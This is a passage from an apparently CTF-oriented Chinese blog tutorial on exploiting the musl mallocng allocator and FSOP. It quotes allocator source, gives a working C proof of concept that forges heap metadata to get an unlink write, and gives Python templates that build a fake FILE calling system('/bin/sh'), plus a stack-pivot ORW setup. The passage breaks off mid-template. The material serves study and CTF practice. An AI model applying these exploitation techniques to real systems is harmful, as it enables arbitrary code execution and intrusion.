<code>chunk</code> 区域尽量都填 <code>0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_nominal_size</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *end)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> reserved = p[<span class="number">-3</span>] &gt;&gt; <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (reserved &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        assert(reserved == <span class="number">5</span>);</span><br><span class="line">        reserved = *(<span class="type">const</span> <span class="type">uint32_t</span> *) (end - <span class="number">4</span>);</span><br><span class="line">        assert(reserved &gt;= <span class="number">5</span>);</span><br><span class="line">        assert(!end[<span class="number">-5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(reserved &lt;= end - p);</span><br><span class="line">    assert(!*(end - reserved));</span><br><span class="line">    <span class="comment">// also check the slot&#x27;s overflow byte</span></span><br><span class="line">    assert(!*end);</span><br><span class="line">    <span class="keyword">return</span> end - reserved - p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后在 <code>free</code> 中的循环满足条件跳出循环调用 <code>nontrivial_free</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">    <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">    <span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">    assert(!(mask &amp; self));</span><br><span class="line">    <span class="keyword">if</span> (!freed || mask + self == all) <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br></pre></td></tr></table></figure><p>进入 <code>nontrivial_free</code> 函数后会执行如下代码。<code>okay_to_free</code> 函数返回非 <code>0</code> 的前提是 <code>meta-&gt;freeable</code> 非 <code>0</code>，另外还要确保 <code>meta-&gt;sizeclass &lt; 48</code> 。之后调用 <code>dequeue</code> 函数触发 <code>unlink</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span> &lt;&lt; i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask + self == (<span class="number">2u</span> &lt;&lt; g-&gt;last_idx) - <span class="number">1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">    <span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">    <span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">    <span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="type">int</span> activate_new = (ctx.active[sc] == g);</span><br><span class="line">        dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">        <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">            activate_group(ctx.active[sc]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>之后进入 <code>free_group</code> 函数后为了减小伪造难度不再调用 <code>nontrivial_free</code> 要保证 <code>maplen</code> 不为零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">        ctx.usage_by_class[sc] -= g-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">        step_seq();</span><br><span class="line">        record_seq(sc);</span><br><span class="line">        mi.base = g-&gt;mem;</span><br><span class="line">        mi.len = g-&gt;maplen * <span class="number">4096UL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">        <span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">        g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">        mi = nontrivial_free(m, idx);</span><br><span class="line">    &#125;</span><br><span class="line">    free_meta(g);</span><br><span class="line">    <span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IB 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_CHUNK_SIZE 0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_CHUNK_INDEX 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_INDEX 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">        <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">        <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">        <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">        <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">        <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">        <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">        <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">        <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">        <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">size_to_class</span><span class="params">(<span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    n = (n + IB - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="type">int</span> i = (<span class="number">28</span> - __builtin_ctz(n)) * <span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i + <span class="number">1</span>]) i += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i]) i++;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;</span><br><span class="line">    <span class="type">int</span> init_done;</span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span></span><br><span class="line">    <span class="type">size_t</span> usage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx: <span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">uintptr_t</span> last_idx: <span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable: <span class="number">1</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass: <span class="number">6</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> maplen: <span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>) - <span class="number">12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> *<span class="title">ctx</span> =</span> (<span class="keyword">struct</span> malloc_context *) (&amp;<span class="built_in">printf</span> + <span class="number">0x247193</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">target</span> =</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *mmap_space = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">fake_meta_area</span> =</span> mmap_space;</span><br><span class="line">    fake_meta_area-&gt;check = ctx-&gt;secret;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">fake_meta</span> =</span> (<span class="keyword">struct</span> meta *) ((<span class="type">uint64_t</span>) mmap_space + <span class="number">0x100</span>);</span><br><span class="line">    fake_meta-&gt;maplen = <span class="number">1</span>;</span><br><span class="line">    fake_meta-&gt;sizeclass = size_to_class(FAKE_CHUNK_SIZE - IB);</span><br><span class="line">    fake_meta-&gt;last_idx = LAST_INDEX;</span><br><span class="line">    fake_meta-&gt;freeable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">fake_group</span> =</span> (<span class="keyword">struct</span> group *) ((<span class="type">uint64_t</span>) mmap_space + <span class="number">0x1000</span>);</span><br><span class="line">    fake_meta-&gt;mem = fake_group;</span><br><span class="line">    fake_group-&gt;meta = fake_meta;</span><br><span class="line">    fake_meta-&gt;avail_mask = ((<span class="number">2U</span> &lt;&lt; LAST_INDEX) - <span class="number">1</span>) ^ (<span class="number">1</span> &lt;&lt; FAKE_CHUNK_INDEX);</span><br><span class="line">    fake_meta-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *fake_chunk = (<span class="type">uint8_t</span> *) ((<span class="type">uint64_t</span>) fake_group-&gt;storage + size_classes[fake_meta-&gt;sizeclass] * UNIT * FAKE_CHUNK_INDEX);</span><br><span class="line">    *(<span class="type">uint16_t</span> *) (fake_chunk - <span class="number">2</span>) = (fake_chunk - fake_group-&gt;storage) / UNIT;</span><br><span class="line">    fake_chunk[<span class="number">-3</span>] = FAKE_CHUNK_INDEX;</span><br><span class="line"></span><br><span class="line">    fake_meta-&gt;prev = fake_meta-&gt;next = &amp;target;</span><br><span class="line">    <span class="built_in">free</span>(fake_chunk);</span><br><span class="line">    assert(target.prev == target.next &amp;&amp; target.prev == &amp;target);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fsop"><a href="#fsop" class="headerlink" title="fsop"></a>fsop</h2><h3 id="IO-file结构体"><a href="#IO-file结构体" class="headerlink" title="IO_file结构体"></a>IO_file结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">    <span class="type">int</span> (*close)(FILE *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">    <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    FILE *prev, *next;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> pipe_pid;</span><br><span class="line">    <span class="type">long</span> lockcount;</span><br><span class="line">    <span class="type">int</span> mode;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> lbf;</span><br><span class="line">    <span class="type">void</span> *cookie;</span><br><span class="line">    <span class="type">off_t</span> off;</span><br><span class="line">    <span class="type">char</span> *getln_buf;</span><br><span class="line">    <span class="type">void</span> *mustbezero_2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">    <span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">    FILE *prev_locked, *next_locked;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="exit利用链"><a href="#exit利用链" class="headerlink" title="exit利用链"></a>exit利用链</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="keyword">volatile</span> __stdin_used = &amp;__stdin_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stdout_used = &amp;__stdout_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stderr_used = &amp;__stderr_FILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">    __funcs_on_exit();</span><br><span class="line">    __libc_exit_fini();</span><br><span class="line">    __stdio_exit();</span><br><span class="line">    _Exit(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>) &#123;</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">for</span> (f = *__ofl_lock(); f; f = f-&gt;next) close_file(f);</span><br><span class="line">    close_file(__stdin_used);</span><br><span class="line">    close_file(__stdout_used);</span><br><span class="line">    close_file(__stderr_used);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">    FFINALLOCK(f);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos - f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>exit</code>函数最终会调用到三个<code>io file</code>的<code>write</code>函数和<code>seek</code>函数，我们可以将 <code>FILE</code> 结构体开头的几个字节修改为 <code>/bin/sh</code> ，再修改 <code>write</code> 指针的值为 <code>system</code> ，以及修改 <code>f-&gt;wpos</code> 、<code>f-&gt;wbase</code> 中其中之一就可以调用到 <code>system(“/bin/sh”)</code><br>总结来说，就是在无沙箱时，需要修改 <code>_IO_FILE</code> 结构体的几个地方：</p><ul><li>起始位置写入 <code>/bin/sh</code></li><li><code>write</code> 写入 <code>system</code> 函数地址。</li><li>好将 <code>lock</code> 设置为小于 <code>0</code> 避免程序卡死在 <code>__lockfile</code> 函数中。(等于 <code>0</code> 貌似也可以)</li></ul><p>fake_file getshell模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x1919810</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc_base+libc.symols[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br></pre></td></tr></table></figure><p>若需要<code>orw</code>，这需要一下<code>gadget</code>：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br></pre></td></tr></table></figure><p>总结来说，就是在有沙箱时，需要修改 <code>_IO_FILE</code> 结构体的 <code>3</code> 个地方：</p><ul><li><code>f-&gt;wbase</code> 写入第一个 <code>gadget</code> 地址使得 <code>f-&gt;wpos 、f-&gt;wbase</code> 不等的同时能够执行到 <code>gadget</code></li><li><code>write</code> 写入刚才提到的栈迁移的 <code>gadget</code></li><li>偏移 <code>0x30</code> 处写入新的栈地址配合栈迁移 <code>gadget</code> 完成栈迁移</li><li>此外还需要在其他地方构造好 <code>ROP</code> 链用于 <code>orw</code></li></ul><p>模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span 